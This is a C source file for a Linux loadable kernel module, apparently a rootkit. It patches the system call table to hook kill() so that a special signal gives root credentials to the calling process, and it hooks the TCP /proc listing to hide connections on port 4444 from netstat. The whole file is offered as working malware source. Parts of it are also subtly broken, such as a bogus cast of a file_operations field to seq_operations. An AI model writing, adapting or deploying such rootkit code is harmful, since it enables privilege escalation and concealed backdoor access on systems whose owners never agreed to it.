#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/sched/signal.h>
#include <linux/cred.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/inet_diag.h>
#include <linux/kallsyms.h>
#include "bico_lkm.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("b3c001");
MODULE_DESCRIPTION("LKM Stealth do Bico");
MODULE_VERSION("0.1");

static asmlinkage long (*original_kill)(const struct pt_regs *);
static int (*real_tcp4_seq_show)(struct seq_file *, void *) = NULL;
static struct list_head *tcp4_seq_ops_list = NULL;

static int fake_tcp4_seq_show(struct seq_file *seq, void *v) {
    char *buffer;
    if (v != SEQ_START_TOKEN) {
        buffer = (char *)seq->buf + seq->count;
        if (strstr(buffer, "0A1C")) return 0; // Porta 4444 em hex little-endian: 0x1C0A → 0A1C
    }
    return real_tcp4_seq_show(seq, v);
}

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == ROOT_SIGNAL) {
        struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (task) {
            struct cred *newcreds = prepare_kernel_cred(NULL);
            if (newcreds) {
                commit_creds(newcreds);
                printk(KERN_INFO "[bico] root escalado via sinal %d para pid %d\n", sig, pid);
                return 0;
            }
        }
    }

    return original_kill(regs);
}

static int __init bico_init(void) {
    unsigned long *sys_call_table;

    printk(KERN_INFO "[bico] Iniciando módulo stealth\n");

    // Hook kill syscall
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    write_cr0(read_cr0() & (~0x10000));
    original_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hook_kill;
    write_cr0(read_cr0() | 0x10000);

    // Hook netstat
    struct file_operations *fops = (struct file_operations *)kallsyms_lookup_name("tcp4_seq_fops");
    if (fops) {
        real_tcp4_seq_show = ((struct seq_operations *)fops->owner)->show;
        ((struct seq_operations *)fops->owner)->show = fake_tcp4_seq_show;
    }

    return 0;
}

static void __exit bico_exit(void) {
    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "[bico] Módulo removido.\n");
}

module_init(bico_init);
module_exit(bico_exit);
